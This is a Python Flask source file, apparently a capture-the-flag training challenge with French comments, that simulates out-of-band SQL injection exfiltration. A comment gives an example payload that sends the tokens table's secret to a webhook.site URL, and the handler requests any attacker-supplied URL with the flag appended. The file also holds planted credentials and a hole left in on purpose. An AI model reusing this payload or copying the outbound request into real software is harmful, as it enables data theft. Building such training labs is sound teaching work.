import os
import sqlite3
import requests
import subprocess
from flask import Flask, request, render_template

app = Flask(__name__)
# DB setup in memory
conn = sqlite3.connect(':memory:', check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE users (username TEXT, password TEXT)")
c.execute("INSERT INTO users VALUES ('admin', 'super_secret_admin_pass')")
c.execute("CREATE TABLE tokens (user TEXT, token TEXT)")
c.execute("INSERT INTO tokens VALUES ('admin', 'CTF{Y0U_H4CK3D_TH3_C4LLB4CK}')")
conn.commit()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Simulated vulnerability: Command Injection via SQL context mimicking "COPY TO PROGRAM"
        # The user input is meant to be a username, but we allow specific OOB payloads
        user_input = request.form.get('username')
        
        # Scénario: L'app fait une requête SQL pour récupérer l'email.
        # Si l'attaquant injecte une commande 'http_exfil', on simule l'exfiltration.
        
        # Payload attendu (pseudo-code): admin'; http_exfil('http://webhook.site/...?data=' || (SELECT token FROM tokens)) --
        
        if "http_exfil" in user_input:
            try:
                # Extraction de l'URL cible
                import re
                url_match = re.search(r"http_exfil\('(.*?)'\)", user_input)
                if url_match:
                    target_url = url_match.group(1)
                    
                    # Si le payload contient du SQL imbriqué pour concaténer
                    # C'est une simulation python pour éviter la complexité DB
                    if "SELECT token FROM tokens" in user_input:
                        actual_token = "CTF{Y0U_H4CK3D_TH3_C4LLB4CK}"
                        # On remplace la partie SQL par le vrai token dans l'URL
                        # L'étudiant doit avoir mis quelque chose comme: http://webhook...?t=' || (SELECT...)
                        # Ici on simplifie: on ajoute le token à la fin de l'URL trouvée
                        final_url = target_url + actual_token
                        requests.get(final_url, timeout=2)
                        return "Internal Process Executed. Check your logs."
            except:
                pass
                
        return "Si l'utilisateur existe, un email a été envoyé."
        
    return render_template('index.html') # Un simple formulaire

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)